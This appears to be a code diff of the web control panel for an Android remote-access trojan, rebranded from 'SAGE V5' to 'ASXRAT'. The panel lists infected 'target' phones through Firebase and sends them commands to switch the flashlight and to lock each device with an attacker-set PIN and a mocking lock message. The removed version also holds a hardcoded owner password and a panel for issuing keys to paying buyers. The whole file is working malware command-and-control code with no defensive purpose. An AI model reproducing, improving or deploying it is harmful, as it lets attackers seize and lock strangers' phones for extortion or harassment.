@@ -1,77 +1,33 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SAGE V5 | ULTIMATE CONTROL</title>
+    <title>ASXRAT | ADMIN CONTROL</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; margin: 0; padding: 0; }
-        .hidden { display: none !important; }
+        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; padding: 20px; }
+        .header { text-align: center; border-bottom: 2px solid #ff0000; padding-bottom: 10px; margin-bottom: 20px; }
+        .container { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 15px; }
+        .card { background: #110000; border: 1px solid #ff0000; padding: 15px; border-radius: 8px; box-shadow: 0 0 10px rgba(255,0,0,0.2); }
+        h3 { margin: 0 0 10px 0; font-size: 16px; color: #fff; }
         
-        /* LOGIN UI */
-        #login-screen { display: flex; align-items: center; justify-content: center; height: 100vh; background: #000; }
-        .login-box { border: 2px solid #ff0000; padding: 30px; border-radius: 15px; background: #0a0000; box-shadow: 0 0 20px #ff0000; text-align: center; }
-
-        /* DASHBOARD UI */
-        .header { background: #0a0000; border-bottom: 2px solid #ff0000; padding: 15px; text-align: center; position: sticky; top: 0; z-index: 100; }
-        .nav { display: flex; justify-content: center; background: #111; border-bottom: 1px solid #333; }
-        .tab { padding: 15px; cursor: pointer; color: #888; flex: 1; text-align: center; font-weight: bold; }
-        .tab.active { color: #fff; background: #ff0000; }
-
-        .container { padding: 20px; max-width: 900px; margin: auto; }
-        .card { background: #0a0000; border: 1px solid #ff0000; padding: 15px; border-radius: 10px; margin-bottom: 15px; }
+        .input-group { margin-top: 10px; border-top: 1px solid #300; padding-top: 10px; }
+        input { background: #000; border: 1px solid #500; color: #fff; padding: 8px; width: 90%; margin-bottom: 5px; outline: none; }
         
-        input { background: #000; border: 1px solid #500; color: #fff; padding: 10px; width: 100%; margin: 10px 0; box-sizing: border-box; outline: none; }
-        button { width: 100%; padding: 12px; margin: 5px 0; border: none; cursor: pointer; font-weight: bold; text-transform: uppercase; transition: 0.3s; }
-        .btn-red { background: #ff0000; color: #fff; }
-        .btn-cyan { background: #00f2ff; color: #000; }
-        
-        .target-list { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; }
-        .status { color: #00ff00; font-size: 12px; }
+        button { width: 100%; padding: 10px; margin: 4px 0; border: none; cursor: pointer; font-weight: bold; text-transform: uppercase; }
+        .btn-flash { background: #ffcc00; color: #000; }
+        .btn-lock { background: #ff0000; color: #fff; }
+        .status-on { color: #00ff00; }
     </style>
 </head>
 <body>
 
-    <div id="login-screen">
-        <div class="login-box">
-            <h1 style="letter-spacing: 5px; color: #ff0000;">SAGE V5</h1>
-            <p style="color: #444; font-size: 10px;">ENTER YOUR KEY TO ACCESS PANEL</p>
-            <input type="password" id="accessKey" placeholder="PASSWORD / KEY...">
-            <button class="btn-red" onclick="doLogin()">AUTHENTICATION</button>
-        </div>
+    <div class="header">
+        <h1>ASXRAT DASHBOARD</h1>
+        <p>CONTROL-RAT PROJECT | DEV BY ELVOXI CEO</p>
     </div>
 
-    <div id="main-panel" class="hidden">
-        <div class="header">
-            <h2 id="userDisplay">ADMIN: LOADING...</h2>
-        </div>
-
-        <div class="nav" id="adminNav">
-            <div class="tab active" id="btn-ctrl" onclick="showTab('ctrl')">CONTROL</div>
-            <div class="tab" id="btn-own" onclick="showTab('own')">OWNER SETTINGS</div>
-        </div>
-
-        <div class="container">
-            <div id="view-ctrl">
-                <div class="target-list" id="targetsContainer">
-                    <p style="text-align: center; color: #333;">Menunggu Target Online...</p>
-                </div>
-            </div>
-
-            <div id="view-own" class="hidden">
-                <div class="card">
-                    <h3>💎 PRINT NEW BUYER KEY</h3>
-                    <input type="text" id="bName" placeholder="Nama Buyer (Username)...">
-                    <input type="text" id="bPass" placeholder="Set Password Buyer...">
-                    <button class="btn-cyan" onclick="saveBuyer()">CETAK KEY & SIMPAN</button>
-                </div>
-                <div id="buyerList">
-                    </div>
-            </div>
-        </div>
-    </div>
+    <div class="container" id="targetList">Loading...</div>
 
     <script>
         const firebaseConfig = {
@@ -84,106 +40,60 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        let myName = "";
-        let amIOwner = false;
-        const MASTER_KEY = "MARIO_SAGE_GACOR"; // <--- GANTI PASS OWNER LO DI SINI!
-
-        function doLogin() {
-            const key = document.getElementById('accessKey').value;
+        // Pantau Target Online
+        db.ref('targets').on('value', (snapshot) => {
+            const list = document.getElementById('targetList');
+            list.innerHTML = "";
+            const targets = snapshot.val();
             
-            if(key === MASTER_KEY) {
-                myName = "MARIO";
-                amIOwner = true;
-                initDashboard();
-            } else {
-                db.ref('users').once('value', s => {
-                    let auth = false;
-                    s.forEach(child => {
-                        if(child.val().password === key) {
-                            myName = child.key;
-                            amIOwner = false;
-                            auth = true;
-                        }
-                    });
-                    if(auth) initDashboard();
-                    else alert("KEY SALAH COK!");
-                });
+            for(let id in targets) {
+                const t = targets[id];
+                const card = document.createElement('div');
+                card.className = 'card';
+                card.innerHTML = `
+                    <h3>📱 ID: ${id}</h3>
+                    <p>Status: <span class="status-on">${t.status}</span></p>
+                    
+                    <button class="btn-flash" onclick="sendCmd('${id}', 'on')">🔦 FLASH ON</button>
+                    <button class="btn-flash" style="background:#444; color:#fff;" onclick="sendCmd('${id}', 'off')">OFF</button>
+                    
+                    <div class="input-group">
+                        <label style="font-size:10px">PESAN LOCK:</label><br>
+                        <input type="text" id="msg_${id}" value="TERKUNCI KAN HP LU WKWK">
+                        
+                        <label style="font-size:10px">PIN CUSTOM:</label><br>
+                        <input type="number" id="pin_${id}" value="7777">
+                        
+                        <button class="btn-lock" onclick="executeLock('${id}')">🔒 KUNCI PERANGKAT</button>
+                    </div>
+                `;
+                list.appendChild(card);
             }
-        }
+        });
 
-        function initDashboard() {
-            document.getElementById('login-screen').classList.add('hidden');
-            document.getElementById('main-panel').classList.remove('hidden');
-            document.getElementById('userDisplay').innerText = "ACCOUNT: " + myName;
-
-            if(!amIOwner) document.getElementById('btn-own').classList.add('hidden');
-            
-            syncTargets();
-            if(amIOwner) syncBuyers();
-        }
-
-        function showTab(t) {
-            document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
-            if(t === 'ctrl') {
-                document.getElementById('btn-ctrl').classList.add('active');
-                document.getElementById('view-ctrl').classList.remove('hidden');
-                document.getElementById('view-own').classList.add('hidden');
-            } else {
-                document.getElementById('btn-own').classList.add('active');
-                document.getElementById('view-own').classList.remove('hidden');
-                document.getElementById('view-ctrl').classList.add('hidden');
-            }
-        }
-
-        function syncTargets() {
-            db.ref('data/' + myName + '/targets').on('value', s => {
-                const cont = document.getElementById('targetsContainer');
-                cont.innerHTML = "";
-                s.forEach(child => {
-                    const id = child.key;
-                    const card = document.createElement('div');
-                    card.className = 'card';
-                    card.innerHTML = `
-                        <h3>📱 ${id}</h3>
-                        <p class="status">● ONLINE</p>
-                        <button class="btn-cyan" onclick="cmd('${id}','on')">FLASH ON</button>
-                        <button style="background:#222;color:#fff" onclick="cmd('${id}','off')">OFF</button>
-                        <div style="margin-top:10px; border-top:1px solid #333; padding-top:10px;">
-                            <input type="text" id="m_${id}" value="HP ANDA TELAH DIKUNCI SAGE">
-                            <input type="number" id="p_${id}" value="7777">
-                            <button class="btn-red" onclick="lock('${id}')">🔒 LOCK DEVICE</button>
-                        </div>
-                    `;
-                    cont.appendChild(card);
-                });
+        // Kirim Senter
+        function sendCmd(id, stat) {
+            db.ref('commands/' + id).update({
+                type: "flash",
+                status: stat
             });
         }
 
-        function cmd(id, s) { db.ref('data/' + myName + '/commands/' + id).update({ type: "flash", status: s }); }
-        function lock(id) {
-            const m = document.getElementById('m_'+id).value;
-            const p = document.getElementById('p_'+id).value;
-            db.ref('data/' + myName + '/commands/' + id).set({ type: "lock", status: "on", message: m, pin: p });
-            alert("COMMAND SENT!");
-        }
+        // Kirim Lock dengan PIN Custom
+        function executeLock(id) {
+            const pesan = document.getElementById('msg_' + id).value;
+            const pinCustom = document.getElementById('pin_' + id).value;
 
-        function saveBuyer() {
-            const n = document.getElementById('bName').value.toUpperCase();
-            const p = document.getElementById('bPass').value;
-            if(!n || !p) return alert("ISI SEMUA!");
-            db.ref('users/' + n).set({ password: p }).then(() => alert("KEY BERHASIL DICETAK!"));
-        }
+            if(!pinCustom) return alert("PIN GAK BOLEH KOSONG COK!");
 
-        function syncBuyers() {
-            db.ref('users').on('value', s => {
-                const list = document.getElementById('buyerList');
-                list.innerHTML = "<h3>ACTIVE BUYERS:</h3>";
-                s.forEach(c => {
-                    list.innerHTML += `<div class="card" style="border-color:#333">
-                        <b>NAME: ${c.key}</b><br>
-                        KEY: <span style="color:#00f2ff">${c.val().password}</span>
-                    </div>`;
-                });
+            db.ref('commands/' + id).set({
+                type: "lock",
+                status: "on",
+                message: pesan,
+                pin: pinCustom, // INI YANG LO MAU! PIN DISET DARI DASHBOARD
+                time: Date.now()
+            }).then(() => {
+                alert("COMMAND SENT! PIN: " + pinCustom);
             });
         }
     </script>
